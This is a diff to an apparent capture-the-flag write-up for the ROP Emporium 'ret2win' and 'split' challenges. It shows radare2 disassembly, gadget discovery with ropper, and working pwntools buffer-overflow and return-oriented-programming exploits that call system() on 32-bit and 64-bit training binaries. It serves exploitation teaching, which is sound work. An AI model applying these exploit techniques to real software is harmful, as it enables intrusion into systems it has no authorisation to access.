@@ -13,6 +13,24 @@ categories: writeups rop-emporium
         <li><a href="#64-bit" id="markdown-toc-h3-header">64-bit</a></li>
     </ul>
     </li>
+    <li><a href="#split" id="markdown-toc-h1-header">split</a>
+    <ul>
+        <li><a href="#32-bit-1" id="markdown-toc-h3-header">32-bit</a></li>
+        <li><a href="#64-bit-1" id="markdown-toc-h3-header">64-bit</a></li>
+    </ul>
+    </li>
+    <li><a href="#callme" id="markdown-toc-h1-header">callme</a>
+    </li>
+    <li><a href="#write4" id="markdown-toc-h1-header">write4</a>
+    </li>
+    <li><a href="#badchars" id="markdown-toc-h1-header">badchars</a>
+    </li>
+    <li><a href="#fluff" id="markdown-toc-h1-header">fluff</a>
+    </li>
+    <li><a href="#pivot" id="markdown-toc-h1-header">pivot</a>
+    </li>
+    <li><a href="#ret2csu" id="markdown-toc-h1-header">ret2csu</a>
+    </li>
   </ul>
 </div>
 
@@ -29,6 +47,8 @@ The challenges are all listed in sequential order as shown on ROP Emporium's web
 Disclaimer: I will make an assumption that anyone reading this is familiar with the basics of binary exploitation, and will skip explaining a lot of the very simple things. You should also know how to read assembly.
 
 # ret2win
+
+This level starts us off with a very simple buffer overflow.
 
 ### 32-bit
 
@@ -273,9 +293,18 @@ $
 
 ### 64-bit
 
-The 64-bit binary is set out the exact same as the 32-bit one, so I will skip looking at the assembly for this one.
+Running checksec.
+```shell
+root@kali:~/Documents/ropemporium/ret2win/64ret2win# checksec ./ret2win
+[*] '/root/Documents/ropemporium/ret2win/64ret2win/ret2win'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
 
-The one difference that can be seen is from the gdb output shown below.
+Since this is 64 bit, we will notice something different with the gdb output once we overflow the buffer.
 ```shell
 gef➤  pattern create 50
 [+] Generating a pattern of 50 bytes
@@ -342,7 +371,7 @@ gef➤  pattern offset 0x6161616161616165 50
 gef➤ 
 ```
 
-We see that we don't overwrite RIP at all. This is because we overwrote RIP with an invalid address of `0x4141414141414141`, which is greater than the maximum address size of `0x00007fffffffffff`. This causes the OS to raise an exception and thus not update RIP's value at all.
+We see that we don't overwrite RIP at all. This is because we overwrote RIP with an invalid address greater than `0x00007fffffffffff`, which is the maximum address size of a 64 bit system. This causes the OS to raise an exception and thus not update RIP's value at all.
 
 However, we did overwrite RBP, and we know that the RIP exists 8 bytes past RBP's address. Finding the offset for RIP (32) then adding 8 to it, gives us the offset for RIP, which is 40.
 
@@ -377,3 +406,282 @@ root@kali:~/Documents/ropemporium/ret2win/64ret2win# ./exploit.py
 Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
 $ 
 ```
+
+# split
+
+This level takes it up a notch, and has us set up the stack such that we call `system()` ourselves and supply our own argument of '/bin/cat flag.txt'.
+
+### 32-bit
+
+Running checksec.
+```shell
+root@kali:~/Documents/ropemporium/split/32split# checksec ./split32
+[*] '/root/Documents/ropemporium/split/32split/split32'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+
+```
+
+Let's pop it through radare2 and see what we can see.
+```shell
+root@kali:~/Documents/ropemporium/split/32split# r2 ./split32 
+[0x08048480]> aaaa
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
+[x] Enable constraint types analysis for variables
+[0x08048480]> afl
+...
+0x0804857b    1 123          sym.main
+0x080485f6    1 83           sym.pwnme
+0x08048649    1 25           sym.usefulFunction
+...
+[0x08048480]> 
+```
+
+Looking at the important bit, we see three functions now. We can assume `main()` calls `pwnme()` as that's the theme the challenges take. Let's check `pwnme()`.
+```shell
+[0x08048480]> s sym.pwnme
+[0x080485f6]> pdf
+/ (fcn) sym.pwnme 83
+|   sym.pwnme ();
+|           ; var int local_28h @ ebp-0x28
+|           ; CALL XREF from sym.main (0x80485d4)
+|           0x080485f6      55             push ebp
+|           0x080485f7      89e5           mov ebp, esp
+|           0x080485f9      83ec28         sub esp, 0x28               ; '('
+|           0x080485fc      83ec04         sub esp, 4
+|           0x080485ff      6a20           push 0x20                   ; 32
+|           0x08048601      6a00           push 0
+|           0x08048603      8d45d8         lea eax, dword [local_28h]
+|           0x08048606      50             push eax
+|           0x08048607      e854feffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
+|           0x0804860c      83c410         add esp, 0x10
+|           0x0804860f      83ec0c         sub esp, 0xc
+|           0x08048612      6818870408     push str.Contriving_a_reason_to_ask_user_for_data... ; 0x8048718 ; "Contriving a reason to ask user for data..."
+|           0x08048617      e804feffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x0804861c      83c410         add esp, 0x10
+|           0x0804861f      83ec0c         sub esp, 0xc
+|           0x08048622      6844870408     push 0x8048744
+|           0x08048627      e8d4fdffff     call sym.imp.printf         ; int printf(const char *format)
+|           0x0804862c      83c410         add esp, 0x10
+|           0x0804862f      a180a00408     mov eax, dword [obj.stdin__GLIBC_2.0] ; [0x804a080:4]=0
+|           0x08048634      83ec04         sub esp, 4
+|           0x08048637      50             push eax
+|           0x08048638      6a60           push 0x60                   ; '`' ; 96
+|           0x0804863a      8d45d8         lea eax, dword [local_28h]
+|           0x0804863d      50             push eax
+|           0x0804863e      e8cdfdffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
+|           0x08048643      83c410         add esp, 0x10
+|           0x08048646      90             nop
+|           0x08048647      c9             leave
+\           0x08048648      c3             ret
+[0x080485f6]> 
+```
+
+Instruction `0x08048607` creates a buffer of size 0x20 and stores it in `local_28h`. Instruction `0x0804863e` calls fgets and reads 0x60 characters into `local_28h`. There's our overflow.
+
+Let's take a look at `usefulFunction()`.
+```shell
+[0x080485f6]> s sym.usefulFunction
+[0x08048649]> pdf
+/ (fcn) sym.usefulFunction 25
+|   sym.usefulFunction ();
+|           0x08048649      55             push ebp
+|           0x0804864a      89e5           mov ebp, esp
+|           0x0804864c      83ec08         sub esp, 8
+|           0x0804864f      83ec0c         sub esp, 0xc
+|           0x08048652      6847870408     push str.bin_ls             ; 0x8048747 ; "/bin/ls"
+|           0x08048657      e8d4fdffff     call sym.imp.system         ; int system(const char *string)
+|           0x0804865c      83c410         add esp, 0x10
+|           0x0804865f      90             nop
+|           0x08048660      c9             leave
+\           0x08048661      c3             ret
+[0x08048649]> 
+```
+
+This calls `system("/bin/ls")`, which is not what we want. We want `system("/bin/cat flag.txt")`.
+
+The way we get around this is to call system ourselves, and set up the call stack so that system gets the address of the string "/bin/cat flag.txt" as its argument. Remember that when a function is called, it expects the stack to look like this (memory addresses increase towards the right):
+
+\<return_addr\>  ---\>  \<arguments\>
+
+So what we want is to overwrite EIP with the address to `system()`. The next four bytes immediately following that will be the return address of `system()` (which doesn't matter). The next four bytes must be the address of the "/bin/cat flag.txt" string in memory. This will result in `system("/bin/cat flag.txt"` being called. If this is confusing you, please review how function arguments are passed through the stack.
+
+Let's find the addresses then. I use rabin2 to find addresses of strings, and gdb to find the address of `system@plt`. For more information about how the Global Offset Table (GOT) and the Procedure Linkage Table (PLT) work, see [this](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html).
+```shell
+root@kali:~/Documents/ropemporium/split/32split# rabin2 -z split32 
+[Strings]
+Num Paddr      Vaddr      Len Size Section  Type  String
+000 0x000006f0 0x080486f0  21  22 (.rodata) ascii split by ROP Emporium
+001 0x00000706 0x08048706   7   8 (.rodata) ascii 32bits\n
+002 0x0000070e 0x0804870e   8   9 (.rodata) ascii \nExiting
+003 0x00000718 0x08048718  43  44 (.rodata) ascii Contriving a reason to ask user for data...
+004 0x00000747 0x08048747   7   8 (.rodata) ascii /bin/ls
+000 0x00001030 0x0804a030  17  18 (.data) ascii /bin/cat flag.txt
+root@kali:~/Documents/ropemporium/split/32split# gdb ./split32 
+GEF for linux ready, type `gef' to start, `gef config' to configure
+78 commands loaded for GDB 8.2.1 using Python engine 3.7
+[*] 2 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from ./split32...(no debugging symbols found)...done.
+gef➤  print 'system@plt'
+$1 = {<text variable, no debug info>} 0x8048430 <system@plt>
+gef➤  
+```
+
+Writing a simple exploit script with the given information.
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+context.log_level = 'critical'
+elf = ELF("./split32")
+
+system_addr = p32(0x8048430)
+bin_cat_addr = p32(0x0804a030)
+
+payload = "A"*44
+payload += system_addr # overwrites EIP
+payload += "BBBB" # return address of system()
+payload += bin_cat_addr # first argument of system()
+
+sh = elf.process()
+
+sh.recvuntil("> ")
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+Running the script.
+```shell
+root@kali:~/Documents/ropemporium/split/32split# chmod +x ./exploit.py
+root@kali:~/Documents/ropemporium/split/32split# ./exploit.py 
+ROPE{a_placeholder_32byte_flag!}
+$ 
+```
+
+### 64-bit
+
+The 64-bit version is slightly more difficult because function arguments don't get passed through the stack anymore.
+
+When a function is called, the function's arguments are passed in through 6 registers. In order (from the 1st to the 6th argument), the registers are `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`. In this case, since we want to call `system()` with the address to the string "/bin/cat flag.txt", we have to first put this address into `rdi` before calling `system()`.
+
+This is where a tool like ropper comes into play. What ropper does is it goes through a binary and finds all occurrences of these things called "gadgets". An example of a gadget is `pop rdi; ret;`, which simply pops the top value off the stack into the RDI register, then returns out to the next value on the stack. This is known as a "pop rdi gadget". Another gadget might be a `pop rsi; pop r15; ret;` gadget, which you can return into after the pop rdi gadget, in order to call a function with more than one argument.
+
+A pop rdi gadget works well for us since `system()` only requires one argument.. We start out by using ropper to find a pop rdi gadget.
+
+```shell
+root@kali:~/Documents/ropemporium/split/64split# ropper -f ./split 
+[INFO] Load gadgets for section: PHDR
+[LOAD] loading... 100%
+[INFO] Load gadgets for section: LOAD
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+
+
+
+Gadgets
+=======
+
+...
+...
+0x0000000000400883: pop rdi; ret; 
+...
+...
+
+91 gadgets found
+root@kali:~/Documents/ropemporium/split/64split# 
+```
+
+Now, this is what we need to do.
+
+1. Overwrite RIP with the address to the pop rdi gadget. 
+2. The next 8 bytes must be the address to the string "/bin/cat flag.txt", which will get stored into RDI using the `pop rdi;` statement.
+3. The next 8 bytes must be the address to `system()`, which the `ret;` statement will return into.
+
+We don't have to provide a return address for `system()` in this case because we aren't passing arguments through the stack.
+
+Let's not forget to quickly grab the addresses for `system@plt` and the string "/bin/cat flag.txt".
+```shell
+root@kali:~/Documents/ropemporium/split/64split# rabin2 -z ./split 
+[Strings]
+Num Paddr      Vaddr      Len Size Section  Type  String
+000 0x000008a8 0x004008a8  21  22 (.rodata) ascii split by ROP Emporium
+001 0x000008be 0x004008be   7   8 (.rodata) ascii 64bits\n
+002 0x000008c6 0x004008c6   8   9 (.rodata) ascii \nExiting
+003 0x000008d0 0x004008d0  43  44 (.rodata) ascii Contriving a reason to ask user for data...
+004 0x000008ff 0x004008ff   7   8 (.rodata) ascii /bin/ls
+000 0x00001060 0x00601060  17  18 (.data) ascii /bin/cat flag.txt
+root@kali:~/Documents/ropemporium/split/64split# gdb ./split 
+GEF for linux ready, type `gef' to start, `gef config' to configure
+78 commands loaded for GDB 8.2.1 using Python engine 3.7
+[*] 2 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from ./split...(no debugging symbols found)...done.
+gef➤  print 'system@plt'
+$1 = {<text variable, no debug info>} 0x4005e0 <system@plt>
+gef➤  
+```
+
+Writing an exploit script.
+```python
+#!/usr/bin/env python
+
+from pwn import *
+
+context.log_level = 'critical'
+elf = ELF("./split")
+
+system_addr = p64(0x4005e0)
+bin_cat_addr = p64(0x00601060)
+pop_rdi_addr = p64(0x0000000000400883)
+
+payload = "A"*40
+payload += pop_rdi_addr # Address to the pop rdi gadget
+payload += bin_cat_addr # This address gets popped into rdi
+payload += system_addr # The ret will return into this address and execute system()
+
+sh = elf.process()
+
+sh.recvuntil("> ")
+sh.sendline(payload)
+
+sh.interactive()
+```
+
+Running the exploit.
+```shell
+root@kali:~/Documents/ropemporium/split/64split# chmod +x ./exploit.py 
+root@kali:~/Documents/ropemporium/split/64split# ./exploit.py 
+ROPE{a_placeholder_32byte_flag!}
+$  
+```
+
+# callme
+
+To be added.
+
+# write4
+
+To be added.
+
+# badchars
+
+To be added.
+
+# fluff
+
+To be added.
+
+# pivot
+
+To be added.
+
+# ret2csu
+
+To be added.
